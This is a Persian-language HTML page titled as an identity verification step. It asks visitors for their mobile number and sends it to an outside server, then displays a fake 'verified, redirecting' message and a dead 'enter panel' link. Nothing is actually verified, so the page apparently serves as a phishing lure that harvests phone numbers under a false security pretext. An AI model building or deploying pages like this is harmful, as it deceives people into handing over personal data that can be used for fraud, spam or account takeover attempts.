<!DOCTYPE html>
<html lang="fa">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تایید هویت</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Tahoma, sans-serif; }
        body { background: linear-gradient(135deg, #0f0c29, #302b63, #24243e); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .card { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 40px 30px; max-width: 400px; width: 100%; text-align: center; }
        .icon { font-size: 50px; margin-bottom: 15px; }
        h2 { color: #fff; font-size: 24px; margin-bottom: 10px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
        input { width: 100%; padding: 14px; border: 2px solid #333; border-radius: 12px; background: rgba(255,255,255,0.05); color: #fff; font-size: 16px; outline: none; margin-bottom: 15px; }
        input:focus { border-color: #6c63ff; }
        button { width: 100%; padding: 14px; border: none; border-radius: 12px; background: linear-gradient(135deg, #6c63ff, #5a52d5); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
        button:hover { transform: scale(1.02); }
        button:disabled { opacity: 0.5; }
        #status { margin-top: 15px; font-size: 14px; }
        .success { color: #4CAF50; }
        .error { color: #f44336; }
        .loader { display: none; width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #6c63ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="card">
    <div class="icon">🔒</div>
    <h2>تایید هویت</h2>
    <p>شماره موبایل خود را وارد کنید</p>

    <form id="form">
        <input type="tel" id="phone" placeholder="مثلاً 09123456789" required />
        <button type="submit" id="btn">✅ تایید و ادامه</button>
        <div class="loader" id="loader"></div>
        <div id="status"></div>
    </form>
</div>

<script>
document.getElementById('form').addEventListener('submit', async function(e) {
    e.preventDefault();

    const phone = document.getElementById('phone').value.trim();
    const status = document.getElementById('status');
    const btn = document.getElementById('btn');
    const loader = document.getElementById('loader');

    if (!phone || phone.length < 10) {
        status.textContent = '⚠️ شماره معتبر وارد کن!';
        status.className = 'error';
        return;
    }

    btn.disabled = true;
    btn.textContent = '⏳ در حال ارسال...';
    loader.style.display = 'block';
    status.textContent = '';

    try {
        // ===== ارسال به سرور خودت =====
        const response = await fetch('https://server-ir.onrender.com/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone: phone })
        });

        const data = await response.json();

        if (data.ok === true) {
            status.textContent = '✅ شماره ارسال شد!';
            status.className = 'success';
            document.getElementById('phone').value = '';
            showSuccess();
        } else {
            status.textContent = '❌ خطا: ' + (data.error_code || data.error || 'نامشخص');
            status.className = 'error';
        }
    } catch (error) {
        status.textContent = '❌ خطا: ' + error.message;
        status.className = 'error';
    }

    btn.disabled = false;
    btn.textContent = '✅ تایید و ادامه';
    loader.style.display = 'none';
});

function showSuccess() {
    document.getElementById('card').innerHTML = `
        <div class="icon">✅</div>
        <h2 style="color:#4CAF50;">تایید شد</h2>
        <p>در حال انتقال...</p>
        <div style="width:50px;height:50px;border:4px solid rgba(255,255,255,0.1);border-top:4px solid #6c63ff;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto;"></div>
        <a href="#" style="display:inline-block;margin-top:20px;padding:12px 30px;background:#6c63ff;color:#fff;text-decoration:none;border-radius:10px;">ورود به پنل</a>
        <style>
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        </style>
    `;
}
</script>

</body>
</html>
